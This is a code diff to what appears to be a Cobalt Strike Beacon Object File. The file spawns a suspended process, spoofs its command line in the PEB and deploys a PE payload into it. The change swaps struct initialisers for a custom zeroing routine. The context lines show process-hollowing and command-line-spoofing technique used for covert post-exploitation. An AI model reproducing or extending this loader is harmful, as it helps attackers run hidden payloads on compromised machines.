@@ -110,8 +110,8 @@ typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
 BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArguments,
     OUT PPROCESS_INFORMATION pProcInfo, OUT HANDLE* phInputPipe, OUT HANDLE* phOutputPipe) {
 
-    STARTUPINFOA stStartupInfo = { 0 };
-    SECURITY_ATTRIBUTES saSecurity = { 0 };
+    STARTUPINFOA stStartupInfo;
+    SECURITY_ATTRIBUTES saSecurity;
     HANDLE hInputRead = NULL, hInputWrite = NULL, hOutputRead = NULL, hOutputWrite = NULL;
     LPSTR szFakeCommandLine = NULL;
     LPSTR szRealCommandLine = NULL;
@@ -173,9 +173,12 @@ BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArgumen
     }
 
     // Spoof the command line in PEB
-    PROCESS_BASIC_INFORMATION pbi = { 0 };
-    PEB peb = { 0 };
-    RTL_USER_PROCESS_PARAMETERS parameters = { 0 };
+    PROCESS_BASIC_INFORMATION pbi;
+    PEB peb;
+    RTL_USER_PROCESS_PARAMETERS parameters;
+    ZeroMemoryCustom((BYTE*)&pbi, sizeof(pbi));
+    ZeroMemoryCustom((BYTE*)&peb, sizeof(peb));
+    ZeroMemoryCustom((BYTE*)&parameters, sizeof(parameters));
 
     // Get NtQueryInformationProcess
     fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
@@ -291,9 +294,11 @@ BOOL DeployPayload(IN BYTE* pPayloadData, IN LPCSTR szTargetPath, IN OPTIONAL LP
 
     if (!pPayloadData || !szTargetPath) return FALSE;
 
-    PROCESS_INFORMATION stProcInfo = { 0 };
-    CONTEXT ctxThread = { .ContextFlags = CONTEXT_ALL };
-    HANDLE hInputPipe = NULL, hOutputPipe = NULL;
+    PROCESS_INFORMATION stProcInfo;
+    ZeroMemoryCustom((BYTE*)&stProcInfo, sizeof(stProcInfo));
+    CONTEXT ctxThread;
+    ZeroMemoryCustom((BYTE*)&ctxThread, sizeof(ctxThread));
+    ctxThread.ContextFlags = CONTEXT_ALL;    HANDLE hInputPipe = NULL, hOutputPipe = NULL;
     BYTE* pRemoteMem = NULL;
     PIMAGE_NT_HEADERS pNtHeaders = NULL;
     PIMAGE_SECTION_HEADER pSections = NULL;
@@ -399,7 +404,8 @@ void go(char* args, int len) {
     datap parser;
     BeaconDataParse(&parser, args, len);
  
-    char peArgs[2048] = {0};
+    char peArgs[2048];
+    ZeroMemoryCustom((BYTE*)peArgs, sizeof(peArgs));
  
     int argCount = 0;
     char *currentArg;
